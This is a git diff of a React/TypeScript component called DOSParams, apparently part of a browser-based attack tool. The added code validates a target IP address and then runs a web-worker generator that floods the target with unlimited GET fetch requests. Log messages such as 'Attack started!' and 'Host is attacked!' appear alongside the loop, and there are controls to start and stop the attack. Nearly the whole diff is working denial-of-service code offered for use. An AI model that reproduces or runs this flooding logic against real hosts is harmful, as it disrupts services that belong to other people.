@@ -1,69 +1,163 @@
-import { FC, useState, useEffect } from 'react'
+import { FC, useEffect, useState } from 'react'
 import AttackParamsWrapper from '@/hoc/attack-params-wrapper/AttackParamsWrapper'
 import AttackTrigger from '@/components/ui/triggers/attack-trigger/AttackTrigger'
-import { Input, Textarea } from '@chakra-ui/react'
+import { Icon, Input, Text } from '@chakra-ui/react'
 import { BiSolidRightArrow } from 'react-icons/bi'
 import { IoStop } from 'react-icons/io5'
 import IconTooltipBtn from '@/components/ui/buttons/icon-tooltip-btn/IconTooltipBtn'
 import { useActions } from '@/hooks/useActions/useActions'
 import makeReq from '@/utils/makeReq'
+import { useSelector } from 'react-redux'
+import { GoPaperclip } from 'react-icons/go'
+import { RootState } from '@/store'
+import { useNavigate } from "react-router-dom";
+import { RunTaskAPI, useTask } from '@tynik/web-workers';
 
 const DOSParams : FC = () => {
-    const { updateLogs } = useActions()
 
-    const [isAttacks, setIsAttacks] = useState(false)
-    const [ipAdress, setIPAdress] = useState('')
-    const [ipAdressError, setIPAdressError] = useState(false)
-    const [reqBody, setReqBody] = useState('')
+    const [infinityGeneratorTask] = useTask(
+        function* (url) {
+            let status = true
+            if(!status) return
 
-    const [allowWorkers, setAllowWorkers] = useState(false)
+            while (1) {
+                fetch(url, {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    credentials: "same-origin"
+                })
+                .catch(err =>{
+                    status = false
+                    throw err
+                })
 
-    const checkData = async () => {
-        setIsAttacks(true)
-        updateLogs({ type: 'info', time: Date.now(), ctx: 'Process initialization..' })
-        updateLogs({ type: 'info', time: Date.now(), ctx: 'Validation of input data..' })
+                if(status) yield
+            }
+        }
+        )
+    
+    const { updateLogs, setAttackSwitcher } = useActions()
+    const { attackSwitcher } = useSelector((state:RootState) => state )
 
-        if(!ipAdress.length) {
-            updateLogs({ type: 'error', time: Date.now(), ctx: 'IP address not specified' })
+    const [ipAddress, setIPAddress] = useState('')
+    const [ipAddressError, setIPAdressError] = useState(false)
+
+    const [doDosAttack, setDoDosAttack] = useState(false)
+    const [attackInst, setAttackInst] = useState<RunTaskAPI<[url: string], any, any> | null>()
+    const [attackInterval, setAttackInterval] = useState<NodeJS.Timeout>()
+
+    
+    const [reqSwitcher, setReqSwitcher] = useState(true)
+    
+    const navigate = useNavigate();
+    const { resetLogs, lastIsLoaded } = useActions()
+
+    //TODO:
+    // const [reqBody, setReqBody] = useState('')
+    // const [reqBodyError, setReqBodyError] = useState(false)
+
+    const checkIPAddress = () => {
+        updateLogs({ type: 'info', time: Date.now(), ctx: 'Process initialization. Validation of input data..', isLoaded: true })
+
+        if(!ipAddress.length) {
+            updateLogs({ type: 'error', time: Date.now(), ctx: 'IP address not specified!', isLoaded: true })
             setIPAdressError(true)
-            setIsAttacks(false)
-            return
+            return false
         }
 
-        updateLogs({ type: 'info', time: Date.now(), ctx: 'Checking ip address..' })
+        setTimeout(() => checkHost(), 1500)
+    }
+
+    const checkHost = async () => {
+        updateLogs({ type: 'info', time: Date.now(), ctx: 'Checking ip address..', isLoaded: false })
         // check host
         try {
-            const adressRes = await makeReq(ipAdress)
-            if(adressRes) updateLogs({ type: 'info', time: Date.now(), ctx: 'IP address verification completed, host is accessible' })
+            const addressRes = await makeReq(ipAddress)
+            if(addressRes){
+                lastIsLoaded()
+                updateLogs({ type: 'info', time: Date.now(), ctx: 'IP address verification completed, host is accessible', isLoaded: true })
+                
+                setTimeout(() => checkReqData(), 500)
+            }
         } catch (error) {
-            updateLogs({ type: 'error', time: Date.now(), ctx: 'Unable to check IP address' })   
+            lastIsLoaded()
+            updateLogs({ type: 'error', time: Date.now(), ctx: 'Unable to check IP address', isLoaded: true })
+            updateLogs({ type: 'error', time: Date.now(), ctx: error!.toString(), isLoaded: true })
             setIPAdressError(true)
-            setIsAttacks(false)  
-            return
+            return false
         }
+    }
 
-        // prepare JSON
-        // launch attack
-        updateLogs({ type: 'info', time: Date.now(), ctx: 'Attack started!' })
-        setAllowWorkers(true)
+    const checkReqData = () => {
+        updateLogs({ type: 'info', time: Date.now(), ctx: 'Attack started!', isLoaded: true })
+        setTimeout(() => startAttack(), 500)
+    }
+
+    const startAttack = () => {
+            setAttackSwitcher()
+            setDoDosAttack(true)
+            const attack = infinityGeneratorTask.run(ipAddress)
+            setIPAdressError(false)
+            setAttackInst(attack)
+    }
+
+    const stopAttack = () => {
+        if(doDosAttack) {
+            updateLogs({ type: 'error', time: Date.now(), ctx: 'Attack stopped!', isLoaded: true })
+            setAttackSwitcher()
+            setDoDosAttack(false)
+            infinityGeneratorTask.stop()
+            setAttackInst(null)
+            clearInterval(attackInterval)
+        }
+    }
+
+    const exit = () => {
+        stopAttack()
+        resetLogs()
+        navigate('/')
     }
 
     useEffect(()=>{
-        if(ipAdressError){
-           if(ipAdress.length){
+        if(ipAddress.length && ipAddressError){
             setIPAdressError(false)
-           } 
         }
-    },[ipAdress])
+    }, [ipAddress])
 
     useEffect(()=>{
-        if(!isAttacks) {
-            setAllowWorkers(false)
+        if(doDosAttack){
+            const int = setInterval(async ()=>{
+                if(reqSwitcher){
+                    setReqSwitcher(false)
+                    try {
+                        updateLogs({ type: 'info', time: Date.now(), ctx: JSON.stringify(attackInst), isLoaded: true })
+                        
+                        if(attackInst){
+                            try { 
+                                attackInst.next(ipAddress)
+                                .then((res)=>{
+                                    setReqSwitcher(true)
+                                    updateLogs({ type: 'info', time: Date.now(), ctx: JSON.stringify(res), isLoaded: true })
+                                    updateLogs({ type: 'success', time: Date.now(), ctx: 'Host is attacked!', isLoaded: true })
+                                })
+                            } catch {
+                                updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Error when call iterator', isLoaded: true })
+                                stopAttack()
+                            }
+                        }   
+                    } catch {
+                        updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Server is not responding!', isLoaded: true  })
+                        stopAttack()
+                        setIPAdressError(true)
+                    }
+                }
+            }, 100)
+            setAttackInterval(int)
         }
-    }, [isAttacks])
-
+    }, [doDosAttack])
+    
     return(
-        <AttackParamsWrapper>
+        <AttackParamsWrapper handleClick={exit}>
             <AttackTrigger title='DoS' img='dos' />
 
             <div className='w-[400px] flex flex-col gap-3'>
@@ -74,19 +168,20 @@ const DOSParams : FC = () => {
                     border='hidden'
                     size='sm'
                     color='#fff'
-                    value={ipAdress}
-                    onChange={(event)=> setIPAdress(event.target.value)}
-                    isInvalid={ipAdressError}
+                    value={ipAddress}
+                    onChange={(event)=> setIPAddress(event.target.value)}
+                    isInvalid={ipAddressError}
+                    isDisabled={attackSwitcher.value}
                     />
 
                     {
-                        !isAttacks && (
+                        !attackSwitcher.value && (
                             <IconTooltipBtn
                             label='Start'
                             icon={BiSolidRightArrow}
                             size='xs'
                             iColor='var(--main-color)'
-                            clickHandler={() => checkData()}
+                            clickHandler={() => checkIPAddress()}
                             />
                         ) || (
                             <IconTooltipBtn
@@ -94,23 +189,25 @@ const DOSParams : FC = () => {
                             icon={IoStop}
                             size='xs'
                             iColor='var(--red-color)'
-                            clickHandler={() => setIsAttacks(!isAttacks)}
+                            clickHandler={() => stopAttack()}
                             />
                             )
                     }
                 </div>
 
-                <Textarea
-                placeholder='Optional request body in JSON format'
-                resize='none'
-                size='sm'
-                color='#fff'
-                backgroundColor='var(--form-color)'
-                border='hidden'
-                rows={6}
-                value={reqBody}
-                onChange={(event)=> setReqBody(event.target.value)}
-                />
+                <div className='relative'>
+                    <Text className='absolute z-10 top-[6px] left-[12px] hover:cursor-pointer' fontSize='small' color='#9ca3af'>Upload JSON file with req body</Text>
+                    <Icon className='absolute z-10 top-[7px] right-[8px] hover:cursor-pointer' as={GoPaperclip} fontSize='18px' color='#9ca3af' />
+                    <Input
+                    backgroundColor='var(--form-color)'
+                    border='hidden'
+                    size='sm'
+                    color='#fff'
+                    type='file'
+                    className='file:mt-[50px] hover:cursor-pointer'
+                    isDisabled={attackSwitcher.value}
+                    />
+                </div>
             </div>
         </AttackParamsWrapper>
     )
